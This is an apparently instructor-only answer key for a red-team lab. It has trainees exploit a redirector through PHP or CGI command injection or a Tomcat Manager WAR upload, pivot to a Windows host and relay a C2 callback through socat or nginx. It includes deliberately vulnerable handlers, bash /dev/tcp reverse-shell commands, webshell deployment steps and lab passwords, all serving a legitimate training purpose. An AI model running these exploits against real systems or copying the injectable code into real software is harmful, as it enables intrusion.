---
id: B04.M25-key
title: Threat-Rep Mission Rehearsal Lab — Answer Key
artifact_type: answer_key
audience: instructor
block: B04
module_type: lab
legacy_aliases: []
source_status: authored
review_required: true
output_formats:
- docx
- pdf
template_profile: answer_key_v1
sensitivity: instructor_only
---

# Threat-Rep Mission Rehearsal Lab — Answer Key

**Audience:** Instructors only. Do not issue to students.
**Student doc:** [student-brief.md](./student-brief.md)
**Shared env:** `environments/effects_lab_env/vsphere/README.md`

## Objective framing

Students build a lean threat-representative exploitation cell and rehearse:

1. Exploit a dual-homed *nix redirector (Option A, B, or C).
2. Reach a Windows target via RDP or SSH from that foothold.
3. Place a C2 beacon that calls back **through** the redirector to Kali.

Grade **OE rationale**, **budget discipline**, **path fidelity**, **friction /
limits**, and **documented compromises**. There is no single Moodle flag.

## Gold topology (example addressing)

Use addresses inside the student's assigned `/29`. Example for block
`172.16.45.0/29`:

| Role | Example IP | Notes |
| --- | --- | --- |
| Kali ops | `172.16.45.1` | C2 listener; ops-facing |
| Redirector ops NIC | `172.16.45.2` | Exploit surface |
| Redirector private NIC | `172.16.45.3` | Path to Windows |
| Windows target | `172.16.45.4` | Default gateway → `172.16.45.3` (or route via redirector) |

Adjust to the assigned block. Keep all statics in `172.16.45.0/24`.

```text
Kali .1  --exploit-->  Redirector .2/.3  --RDP/SSH-->  Windows .4
                 ^                                         |
                 +-------- C2 callback (forwarder) --------+
```

## Lab credentials (instructor gold defaults)

Rotate if the cadre prefers; document the rotation in the AAR context.

| Host | Account | Password / key | Purpose |
| --- | --- | --- | --- |
| Redirector (all options) | `root` or sudo user `edgeadmin` | `Edge!Redirect01` | Build/admin |
| Windows | `Administrator` or `winadmin` | `Win!Target01` | RDP / OpenSSH |
| Tomcat manager (Option C) | `manager` | `Tomcat!Mgr01` | manager-script / manager-gui |
| Kali | student operator account | local | Listener / tooling |

## Initial situational awareness (instructor demo)

Before live walkthrough on a gold cell, establish context on each hop.

**On Kali:**

```bash
date -u
hostname; whoami; pwd
uname -a
ip -br a
ss -tulpn
```

**On redirector (after console/SSH admin access during build — not the student exploit path):**

```bash
date -u
hostname; whoami; pwd
uname -a
ip -br a
ss -tulpn
```

**On Windows (PowerShell):**

```powershell
Get-Date -AsUTC
hostname; whoami; pwd
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
ipconfig
netstat -ano
```

**Why this matters:** Confirms dual-home addressing, listening exploit surfaces,
and that Windows default route points toward the redirector private NIC before
you claim pass-back success.

---

## Shared post-RCE: Windows reach + C2 pass-back

These steps apply after foothold on any option.

### Reach Windows

From the redirector foothold (interactive shell obtained via the option exploit):

```bash
# RDP from redirector if freerdp/xfreerdp available, or use credentials to
# enable/confirm OpenSSH and connect:
ping -c 2 172.16.45.4
```

Windows: enable RDP and/or OpenSSH Server; allow firewall for the private NIC;
set default gateway to redirector private IP (`172.16.45.3` in the example).

### Forwarder on redirector (example: socat)

On Kali, start a listener (port example `443`):

```bash
# Example generic listener — use the C2 framework students chose in class
sudo nc -lvnp 443
```

On redirector (ops-facing listens, forwards to Kali):

```bash
# TCP pass-back: Windows -> redirector:8443 -> Kali:443
socat TCP-LISTEN:8443,fork,reuseaddr TCP:172.16.45.1:443
```

On Windows, point the beacon/callback host to `172.16.45.3:8443` (redirector
private), **not** directly to Kali.

**How students know these values:** They chose the addresses on their diagram;
the forwarder listen port is an operator knob they document; Kali listener port
must match the forwarder target.

### Alternate forwarder (nginx stream)

```nginx
stream {
    server {
        listen 8443;
        proxy_pass 172.16.45.1:443;
    }
}
```

---

## Option A — Soft-edge PHP (Ubuntu): setup + exploit

### Setup (instructor / gold rebuild)

1. Deploy Ubuntu LTS. Configure dual NIC (`.2` ops, `.3` private).
2. Install web stack:

```bash
sudo apt update
sudo apt install -y nginx php-fpm php-cli
```

3. Create site root and intentional unsafe health page (lab-only):

```bash
sudo mkdir -p /var/www/edge
sudo tee /var/www/edge/health.php >/dev/null <<'EOF'
<?php
// LAB ONLY — intentional OS command injection for threat-rep reconstruct
if (isset($_GET['q'])) {
    echo "<pre>";
    system($_GET['q']);
    echo "</pre>";
} else {
    echo "edge health ok";
}
EOF
```

4. Point nginx `root` to `/var/www/edge` and enable PHP-FPM for `.php`.
5. Confirm from Kali: `curl -s "http://172.16.45.2/health.php"` → `edge health ok`.
6. Build Windows on `.4` with gateway `.3`; enable RDP/SSH.

### Exploit walkthrough

```bash
# Confirm injection (whoami)
curl -s "http://172.16.45.2/health.php?q=whoami"

# Reverse shell example (adjust IP/port). On Kali: nc -lvnp 4444
curl -s "http://172.16.45.2/health.php?q=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/172.16.45.1/4444%200>%261'"
```

**First-use notes:**

- `curl` issues the HTTP request that hits the unsafe `system()` call.
- URL-encoding (`%20`, `%26`) preserves spaces and shell metacharacters in the query string.
- Prefer a stable interactive foothold before configuring `socat` / nginx stream.

Then complete **Shared post-RCE** steps.

### Expected findings

- `health.php?q=id` returns `www-data` (or PHP pool user).
- Private ping/RDP to Windows succeeds only via redirector private NIC.
- Beacon to Kali appears only when forwarder is up and Windows targets redirector.

---

## Option B — Legacy CGI (Debian): setup + exploit

### Setup

1. Deploy Debian. Dual NIC (`.2` / `.3`).
2. Install Apache CGI:

```bash
sudo apt update
sudo apt install -y apache2
sudo a2enmod cgid
sudo systemctl restart apache2
```

3. Place unsafe CGI status script:

```bash
sudo tee /usr/lib/cgi-bin/status.cgi >/dev/null <<'EOF'
#!/bin/bash
# LAB ONLY — intentional CGI command injection
echo "Content-Type: text/plain"
echo
echo "edge status"
if [ -n "$QUERY_STRING" ]; then
  # Naive parse: cmd=<command>
  cmd="${QUERY_STRING#cmd=}"
  cmd="${cmd%%&*}"
  cmd=$(printf '%b' "${cmd//%/\\x}")
  eval "$cmd"
fi
EOF
sudo chmod 755 /usr/lib/cgi-bin/status.cgi
```

4. Confirm: `curl -s "http://172.16.45.2/cgi-bin/status.cgi"` → `edge status`.

### Exploit walkthrough

```bash
# whoami via cmd=
curl -s "http://172.16.45.2/cgi-bin/status.cgi?cmd=id"

# Reverse shell (Kali listening on 4444)
curl -s "http://172.16.45.2/cgi-bin/status.cgi?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/172.16.45.1/4444%200>%261'"
```

**First-use notes:**

- `a2enmod cgid` enables Apache CGI execution for scripts under the CGI directory.
- `QUERY_STRING` carries the attacker-controlled `cmd` value into the shell.
- URL-decode behavior in the script is intentionally fragile/lab-shaped; keep it simple for gold.

Then complete **Shared post-RCE** steps.

### Expected findings

- CGI responds as the Apache user (often `www-data`).
- Same dual-home / Windows / forwarder success criteria as Option A.

---

## Option C — Tomcat Manager / WAR (Rocky or Alma): setup + exploit

### Setup

1. Deploy Rocky or AlmaLinux. Dual NIC (`.2` / `.3`).
2. Install Tomcat (package names vary by major; example Tomcat 9):

```bash
sudo dnf install -y tomcat tomcat-webapps tomcat-admin-webapps
```

3. Configure manager roles/users in `/etc/tomcat/tomcat-users.xml` (paths may be
   `/etc/tomcat9/` depending on package):

```xml
<role rolename="manager-gui"/>
<role rolename="manager-script"/>
<user username="manager" password="Tomcat!Mgr01" roles="manager-gui,manager-script"/>
```

4. Ensure manager app is deployed (`/manager/html`). Allow access from the
   student `/29` in `manager.xml` valve / RemoteAddrValve if present (lab gold
   often comments out the restrictive valve).
5. Start/enable Tomcat; open port `8080` on the ops NIC.
6. Confirm: browse `http://172.16.45.2:8080/manager/html` with `manager` /
   `Tomcat!Mgr01`.

### Exploit walkthrough

1. From Kali, authenticate to Tomcat Manager.
2. Deploy a simple WAR webshell or reverse-shell WAR via **Deploy** /
   `manager/text/deploy`.
3. Hit the deployed context path to obtain RCE / reverse shell to Kali.
4. Complete **Shared post-RCE** steps (Windows + forwarder + beacon).

**Example manager deploy (curl text API):**

```bash
curl -u 'manager:Tomcat!Mgr01' \
  "http://172.16.45.2:8080/manager/text/deploy?path=/edge&update=true" \
  --upload-file /path/to/lab-shell.war
```

**First-use notes:**

- `manager-script` allows the text API; `manager-gui` allows the browser UI.
- `--upload-file` PUTs the WAR body to the deploy endpoint.
- Keep the lab WAR minimal; this is for cadre gold, not a student download pack.

### Expected findings

- Manager login succeeds with gold creds.
- Deployed WAR executes as the Tomcat service user.
- Same Windows / forwarder / callback criteria as A and B.

---

## Friction and limits (acceptable examples)

| Inject | Predicted | Observed teaching point |
| --- | --- | --- |
| Stop `socat` / reload nginx without stream | Callback dies | Pass-back is load-bearing |
| Deny RDP, leave SSH only | Path changes | Document access-method bound |
| Point beacon at Kali directly | Still "green" | Fails path fidelity grading |
| Bind forwarder only on private NIC | Ops cannot test wrong interface | Interface discipline |

## Grading checkpoints

| Checkpoint | Acceptable | Not acceptable |
| --- | --- | --- |
| OE rationale | Kali + one option + Windows justified; cut list present | Vanity hosts with no plan link |
| Option fidelity | Exploit matches A/B/C inventory | Comfort SSH replacing PHP/CGI/Tomcat surface |
| Path fidelity | Evidence of redirector traversal | Direct Windows→Kali only |
| Friction / limits | ≥1 inject + ≥1 bound with predicted vs observed | Happy-path screenshots only |
| Compromises | Windows stand-in, lab creds, RAM cuts documented | Green result treated as universal proof |
| Resources | ≤ ~50 GB; addresses in `/29` | DHCP-half theft; abandoned clones |

## Troubleshooting (consolidated)

| Symptom | Check |
| --- | --- |
| PHP/CGI 404 | vhost root / CGI path; service running; firewall |
| Tomcat 403 on manager | RemoteAddrValve; roles in `tomcat-users.xml`; admin webapps installed |
| No Windows route | Dual NIC, Windows gateway, firewall, correct private IP |
| Listener silent | Forwarder down; beacon host/port wrong; Windows egress blocked |
| False green | Packet path never hits redirector — require middle-hop evidence |

## Tie-back

- Doctrine: SOM rehearsal against CG/CV edge path.
- ATT&CK: exploitation of public-facing app, lateral movement (RDP/SSH), C2 via proxy/redirector.
- ENGAGE/D3FEND: partner language for edge exposure and redirector inspection opportunities discovered during friction injects.
